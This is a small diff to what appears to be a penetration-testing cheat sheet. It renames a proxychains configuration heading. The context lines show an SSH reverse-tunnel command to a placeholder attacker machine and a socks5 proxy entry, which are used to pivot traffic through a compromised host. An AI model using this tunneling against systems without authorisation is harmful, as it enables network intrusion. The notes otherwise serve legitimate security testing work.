@@ -391,7 +391,7 @@ How to pentest like a Gunnaj
   ssh -N -R <PORT> <ssh_user>@<ATTACK_MACHINE_IP>
   ```
 
-  ### Edit /etc/proxychains4.conf
+  ### Edit /etc/proxychains.conf
   ```shell
   [ProxyList]
   socks5 127.0.0.1 <PORT>
